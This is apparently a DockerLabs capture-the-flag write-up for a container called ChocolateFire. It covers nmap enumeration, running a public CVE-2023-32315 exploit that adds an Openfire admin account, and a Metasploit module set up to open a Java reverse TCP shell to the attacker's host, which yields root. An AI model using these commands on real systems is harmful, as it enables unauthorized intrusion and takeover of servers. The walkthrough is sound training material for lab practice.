![](adjuntos/Pasted%20image%2020260213022119.png)

# ChocolateFire – DockerLabs
> Practical exploitation of CVE-2023-32315 in Openfire leading to Remote Code Execution within a containerized environment.

## 1️⃣Lab Information

-  **Platform:** [DockerLabs](https://dockerlabs.es)     
-  **Environment Type:** Docker container (Podman backend)  
-  **Target Service:** Openfire  
-  **Vulnerability Exploited:** CVE-2023-32315  
-  **Difficulty:** Medium  

### Skills Demonstrated

-  Enumeration (Nmap)
-  CVE research
-  Remote Code Execution (RCE)
-  Linux privilege escalation


## 🐳 2️⃣ Deployment

The machine is deployed as a container using the provided script:
```bash
sudo bash auto_deploy.sh chocolatefire.tar

[+] Image loaded successfully
[+] Container started
[+] Assigned IP: 10.88.0.2
```

## 🔎 3️⃣ Enumeration
```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 10.88.0.2

PORT     STATE SERVICE VERSION
22/tcp   open  ssh
5222/tcp open
5223/tcp open
5262/tcp open
5263/tcp open
5269/tcp open
5270/tcp open
5275/tcp open
5276/tcp open
7070/tcp open  http   Servicio alternativo
7777/tcp open
9090/tcp open  http   Openfire Admin Panel
```

Multiple XMPP-related ports are exposed. However, port **9090** reveals the Openfire administrative console, which represents the highest-impact attack surface.



## 4️⃣ Service Analysis

Port **9090/tcp** exposes the **Openfire administrative console**.

The web interface confirms the presence of the **Openfire Admin Console**, protected by authentication.

📌 High-impact service identified. Exploitation is prioritized.

![](adjuntos/Pasted%20image%2020260213030820.png)


## 5️⃣ Exploit Identification and Preparation

The associated vulnerability is identified as:

- **CVE-2023-32315**
- Authentication bypass in Openfire


Public exploit available at:

[https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT)

### 5.1 🔎 Exploit Analysis

The script leverages a flaw in Openfire’s authentication mechanism, allowing the credential validation process to be bypassed.

The exploit:

- Sends a crafted request to the vulnerable administrative endpoint
- Circumvents the authentication controls
- Executes arbitrary commands within the application context

📌 **Impact:** Authentication bypass leading to Remote Code Execution (RCE).

### 5.2 🐍 Environment Preparation

The exploit is written in Python.  
A virtual environment is created to isolate dependencies and maintain a clean system state.
```bash
python3 -m venv openfire_env
```

Once created, the environment is activated:
```bash
source openfire_env/bin/activate
```

Required libraries are installed:
```bash
pip install requests rich
```

The exploit file is created locally and the code is copied from the identified repository:
```bash
nvim CVE-2023-32315.py
```


## 6️⃣ Exploitation

The exploit is executed against the administrative console:
```bash
python3 CVE-2023-32315.py -u http://10.88.0.2:9090
```

The exploit confirms the vulnerability and creates administrative credentials:
```bash
[*] Launching exploit against: http://10.88.0.2:9090
[+] Target is vulnerable
[+] Successfully added, here are the credentials
[+] Username: hugme
[+] Password: HugmeNOW
```

## 7️⃣ Access Validation
After executing the exploit, access to the administrative console is obtained using the generated credentials:

- **Username:** hugme
- **Password:** HugmeNOW

The successful creation of a privileged account confirms administrative-level access to the Openfire instance.

![](adjuntos/Pasted%20image%2020260213034537.png)


## 8️⃣ System Shell Acquisition

Exploitation is performed via the official Metasploit module corresponding to CVE-2023-32315. A reverse TCP payload is configured to establish remote command execution on the target host.

Launch Metasploit:
```bash
msfconsole
```

Locate the module associated with the identified CVE:
```bash
search CVE-2023-32315
```

Load the corresponding exploit module:
```bash
use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
```

Review the required configuration parameters prior to execution:
```bash
show options
```

![](adjuntos/Pasted%20image%2020260213040718.png)

Configure the module to establish the reverse shell:
```bash
set RHOSTS 10.88.0.2
set RPORT 9090
set PAYLOAD java/shell/reverse_tcp
set LHOST 10.88.0.1
set LPORT 4444
```

Execute the module:
```bash
run
```

![](adjuntos/Pasted%20image%2020260213041738.png)

Once the shell is obtained, the privilege level is verified:
```bash
 whoami
 root
```
 
Remote code execution has been successfully achieved via **CVE-2023-32315**, resulting in direct system-level access with **root privileges**.

🎯 **Full container compromise completed.**